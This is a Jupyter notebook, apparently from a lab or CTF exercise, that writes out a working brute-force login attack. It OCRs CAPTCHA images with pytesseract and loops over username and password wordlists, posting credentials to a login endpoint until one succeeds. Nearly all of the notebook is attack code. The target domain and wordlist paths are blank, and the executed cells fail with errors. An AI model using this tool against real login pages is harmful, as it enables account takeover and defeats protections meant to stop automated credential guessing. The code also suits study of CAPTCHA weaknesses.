In [13]:
import requests
import pytesseract
from PIL import Image
from io import BytesIO
import sys
from IPython.display import display

"Libs successfully loaded"

'Libs successfully loaded'

In [5]:
# Setup
HOME_URL = "https://.com"
LOGIN_URL = f"{HOME_URL}/login"
CAPTCHA_URL = f"{HOME_URL}/captcha"

for url in [HOME_URL, LOGIN_URL, CAPTCHA_URL]:
  print(url)

https://.com
https://.com/login
https://.com/captcha


In [8]:
# Start a persistent session
session = requests.Session()

In [9]:
def get_new_captcha():
  """Fetch and OCR the current CAPTCHA"""
  session.get(LOGIN_URL) # Visit the login page (to start a new session s)
  response = session.get(CAPTCHA_URL) # request the CAPTCHA image (generated for session s)
  image = Image.open(BytesIO(response.content)) # Convert the image bytes into a PIL Image

  captcha_text = pytesseract.image_to_string(image, confi='--psm 7 digits')
  return image, captcha_text.strip()

In [11]:
image, captcha_text = get_new_captcha()
image

InvalidURL: URL has an invalid label.

In [12]:
captcha_text

NameError: name 'captcha_text' is not defined

In [ ]:
# Wordlist (Usernames)
filepath = ''

with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
  usernames = f.read().splitlines()

  usernames[:5]

In [ ]:
# Wordlist (Passwords)
filepath = ''

with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
  passwords = f.read().splitlines()

  passwords[:5]

In [ ]:
def brute_force_captcha(usernames, passwords):
  for username in usernames:
    for password in passwords:
      while True: # While captcha unsolved!

        # Step 1: Solve new CAPTCHA
        captcha_image, solved_captcha = get_new_captcha()
        display(captcha_image, solved_captcha)

        # Step 2: Prepare login data
        data = {
            'username': username,
            'password': password,
            'captcha': solved_captcha
        }

        # Step 3: Send the POST request
        response = session.post(LOGIN_URL, data=data)

        # Step 4: Analyze the response
        login_msg = f"username: {username}, password: {password}, captcha: {solved_captcha}"

        if "CAPTCHA failed" in response.text:
          print(f"{login_msg} - [x] CAPTCHA FAILED. Retrying...")
          continue

        elif "Invalid username or password" in response.text:
          print(f"{login_msg} - [x] FAILED: Wrong Credentials")
          break # Break while loop and continue with next password

        else:
          print(f"{login_msg} - SUCCESS!!!")
          print("\033[93m]" + f"MATCH FOUND: username: {username}, password: {password}")
          return username, password

In [ ]:
brute_force_captcha(usernames, passwords)